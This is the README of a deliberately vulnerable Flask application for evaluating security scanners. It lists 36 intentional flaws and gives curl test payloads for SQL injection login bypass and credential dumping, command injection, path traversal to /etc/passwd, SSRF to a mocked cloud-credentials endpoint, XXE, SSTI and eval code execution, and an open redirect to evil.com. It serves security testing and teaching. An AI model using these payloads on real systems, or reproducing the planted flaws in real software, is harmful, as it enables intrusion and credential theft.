# Vulnerable Python Application

A deliberately vulnerable Python web application built with Flask for security testing and SAST/DAST tool evaluation.

> **WARNING**: This application contains intentional security vulnerabilities. Never deploy in production environments.

## Tech Stack

- **Language**: Python 3.11
- **Framework**: Flask 3.0
- **Database**: SQLite (stdlib sqlite3)
- **XML Parser**: lxml + xmllint
- **HTTP Client**: requests
- **Template Engine**: Jinja2 (via Flask)

## Quick Start

```bash
# Using Docker Compose
docker-compose up -d

# Access the application
curl http://localhost:5001/health
```

## Architecture

Hexagonal architecture (ports and adapters):

```
app/
├── main.py                        # Entry point, DI wiring
├── config.py                      # Environment-based configuration
├── adapter/
│   ├── handler/                   # HTTP handlers (inbound adapters)
│   │   ├── auth_handler.py        # Login, user search, open redirect
│   │   ├── product_handler.py     # Product listing/search
│   │   ├── order_handler.py       # Order management
│   │   ├── message_handler.py     # Message board
│   │   ├── review_handler.py      # Product reviews
│   │   ├── file_handler.py        # File read/upload/download
│   │   ├── network_handler.py     # Ping, webhook, proxy
│   │   ├── template_handler.py    # Greeting, invoice, template render
│   │   ├── xml_handler.py         # XML parsing/validation
│   │   ├── admin_handler.py       # Debug, backup, redirect
│   │   ├── deserialize_handler.py # Cart import/export (pickle)
│   │   └── calculator_handler.py  # Expression calculator (eval)
│   └── persistence/               # SQLite repositories (outbound adapters)
│       ├── database.py
│       ├── sqlite_user_repository.py
│       ├── sqlite_product_repository.py
│       ├── sqlite_order_repository.py
│       ├── sqlite_message_repository.py
│       └── sqlite_review_repository.py
└── domain/
    ├── entity/                    # Dataclass models
    ├── repository/                # ABC interfaces (ports)
    └── usecase/                   # Business logic
```

## Implemented Vulnerabilities

| # | Vulnerability | CWE | Endpoint | Parameter |
|---|--------------|-----|----------|-----------|
| 1 | SQL Injection | CWE-89 | POST /api/login | username, password |
| 2 | SQL Injection | CWE-89 | GET /api/products/search | q, category |
| 3 | SQL Injection | CWE-89 | GET /api/orders | user_id |
| 4 | Command Injection | CWE-78 | POST /api/ping | host |
| 5 | Command Injection | CWE-78 | POST /api/backup | name |
| 6 | Path Traversal | CWE-22 | GET /api/files | filename |
| 7 | Path Traversal | CWE-22 | GET /api/files/download | filename |
| 8 | SSRF | CWE-918 | GET /api/fetch | url |
| 9 | SSRF | CWE-918 | POST /api/webhook/test | url |
| 10 | SSRF | CWE-918 | GET /api/proxy | url |
| 11 | Reflected XSS | CWE-79 | GET /users/search | q |
| 12 | Reflected XSS | CWE-79 | GET /products/search | q |
| 13 | Reflected XSS | CWE-79 | GET /network/ping | host |
| 14 | Stored XSS | CWE-79 | GET /messages | (stored content) |
| 15 | Stored XSS | CWE-79 | GET /products/{id}/reviews | (stored comments) |
| 16 | XXE | CWE-611 | POST /api/xml/parse | body (XML) |
| 17 | XXE | CWE-611 | POST /api/xml/validate | body (XML) |
| 18 | Open Redirect | CWE-601 | GET /redirect | url |
| 19 | Open Redirect | CWE-601 | GET /login/callback | redirect |
| 20 | SSTI | CWE-1336 | GET /api/greeting | name |
| 21 | SSTI | CWE-1336 | POST /api/template/render | template |
| 22 | Insecure Deserialization | CWE-502 | POST /api/cart/import | data (pickle) |
| 23 | eval/exec Injection | CWE-94 | GET /api/calculate | expr |
| 24 | eval/exec Injection | CWE-94 | POST /api/calculate/discount | formula |
| 25 | LDAP Injection | CWE-90 | POST /api/ldap/login | username, password |
| 26 | LDAP Injection | CWE-90 | GET /api/ldap/search | q |
| 27 | XPath Injection | CWE-643 | POST /api/xpath/login | username, password |
| 28 | XPath Injection | CWE-643 | GET /api/xpath/query | q |
| 29 | HTTP Header Injection | CWE-113 | GET /api/header/set | name, value |
| 30 | HTTP Header Injection | CWE-113 | GET /api/header/redirect | lang |
| 31 | Log Injection | CWE-117 | POST /api/log/login | username |
| 32 | Log Injection | CWE-117 | POST /api/log/search | query |
| 33 | Log Injection | CWE-117 | GET /api/logs | - |
| 34 | NoSQL Injection | CWE-943 | POST /api/nosql/login | username, password |
| 35 | NoSQL Injection | CWE-943 | POST /api/nosql/query | query |
| 36 | NoSQL Injection | CWE-943 | GET /api/nosql/users | where |

## Test Payloads

### SQL Injection
```bash
# Login bypass
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "anything"}'

# Product search
curl "http://localhost:5001/api/products/search?q=' UNION SELECT 1,username,password,4,email FROM users--"
```

### Command Injection
```bash
curl -X POST http://localhost:5001/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; id"}'
```

### Path Traversal
```bash
curl "http://localhost:5001/api/files?filename=../../etc/passwd"
```

### SSRF
```bash
curl "http://localhost:5001/api/fetch?url=http://internal-api/admin"
curl "http://localhost:5001/api/fetch?url=http://metadata-service/iam/security-credentials/admin-role"
```

### XXE
```bash
curl -X POST http://localhost:5001/api/xml/parse \
  -H "Content-Type: application/json" \
  -d '{"xml": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}'
```

### SSTI (Server-Side Template Injection)
```bash
curl "http://localhost:5001/api/greeting?name={{7*7}}"
curl -X POST http://localhost:5001/api/template/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{ config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read() }}"}'
```

### Insecure Deserialization
```bash
# Export a cart (get pickle format)
curl -X POST http://localhost:5001/api/cart/export \
  -H "Content-Type: application/json" \
  -d '{"items": [{"name": "Laptop", "qty": 1}]}'

# Import with pickle (vulnerable)
curl -X POST http://localhost:5001/api/cart/import \
  -H "Content-Type: application/json" \
  -d '{"data": "<base64-pickle-payload>", "format": "pickle"}'
```

### eval Injection
```bash
curl "http://localhost:5001/api/calculate?expr=__import__('os').popen('id').read()"
```

### Open Redirect
```bash
curl -v "http://localhost:5001/redirect?url=https://evil.com"
```

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| PORT | 5001 | Server port |
| DB_PATH | /app/data/app.db | SQLite database path |
| FILES_DIR | /app/files | Files directory |
| UPLOAD_DIR | /app/uploads | Upload directory |
| EXPORTS_DIR | /app/exports | Exports directory |
| BACKUPS_DIR | /app/backups | Backups directory |

## Docker Services

| Service | Description | Accessible |
|---------|-------------|------------|
| vulnerable-app | Main Flask application | localhost:5001 |
| internal-api | Internal API (SSRF target) | Internal only |
| metadata-service | AWS metadata mock (SSRF target) | Internal only |
